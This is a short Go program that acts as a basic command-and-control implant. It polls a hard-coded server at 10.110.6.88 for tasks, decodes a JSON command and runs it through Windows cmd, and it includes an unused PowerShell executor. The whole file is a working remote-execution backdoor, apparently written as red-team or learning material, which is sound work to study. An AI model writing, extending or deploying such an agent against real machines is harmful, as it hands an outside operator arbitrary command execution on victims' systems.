package main

import (
	"encoding/json"
	"fmt"
	"io/ioutil"
	"log"
	"net/http"
	"os/exec"
	"strings"
)

type Shell struct {
	Cmd string
}

type Powershell struct {
	Cmd string
}

func execShell(arg string) int {
	c := exec.Command("cmd", "/c", arg)
	if err := c.Run(); err != nil {
		fmt.Println("Error: ", err)
	}

	return 1
}

func execPS(arg string) int {
	c := exec.Command("powershell", arg)
	if err := c.Run(); err != nil {
		fmt.Println("Error: ", err)
	}
	return 1
}

func getRequest(serverAddr string, uri string) http.Response {
	resp, err := http.Get(serverAddr + uri)
	if err != nil {
		log.Fatal(err)
	}
	return *resp
}

//func getTasks(url string, structure Shell) int {}

const taskuri string = "http://10.110.6.88/tasks"

func main() {
	var shell Shell
	response := getRequest("http://10.110.6.88:8080", "/tasks")
	body, err := ioutil.ReadAll(response.Body)
	if err != nil {
		log.Fatal(err)
	}
	strBody := string(body)
	if strings.Contains(strBody, "cmd") {
		json.Unmarshal([]byte(body), &shell)
		fmt.Println("execute a cmd prompt")
		fmt.Println("Argument to execute:", shell.Cmd)
	}
	execShell(shell.Cmd)
}
